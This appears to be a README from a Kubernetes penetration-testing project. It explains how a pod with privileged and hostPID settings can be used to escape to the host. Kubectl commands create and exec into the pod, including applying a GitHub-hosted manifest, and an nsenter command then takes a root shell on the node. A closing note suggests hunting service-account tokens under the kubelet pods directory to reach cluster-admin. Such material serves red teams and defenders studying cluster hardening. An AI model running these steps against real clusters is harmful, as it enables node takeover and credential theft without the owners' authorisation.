## Nsenter pod - You can create a pod with privileged: true + hostPID

If you have `privileged=true` and `hostPID` available to you, you can use the `nsenter` command in the pod to enter PID=1 on the host, which allows also you gain a root shell on the host, which provides a path to cluster-admin. 

[pod-priv-and-hostpid.yaml](pod-priv-and-hostpid.yaml)

### Create a pod
```bash
# Option 1: Create pod from local yaml 
kubectl apply -f pod-priv-and-hostpid.yaml [-n namespace] 
# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-priv-and-hostpid.yaml [-n namespace] 
```

### Exec into pod 
```bash
kubectl -n [namespace] exec -it pod-priv-and-hostpid -- bash
```

### Post exploitation
```bash
# Use nsenter to gain full root access on the node
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# You now have full root access to the node
```

# Example privesc path: Hunt for tokens in /host/var/lib/kubelet/pods/
# See notes from easymode pod

Reference(s): 
* https://twitter.com/mauilion/status/1129468485480751104
* https://github.com/kvaps/kubectl-node-shell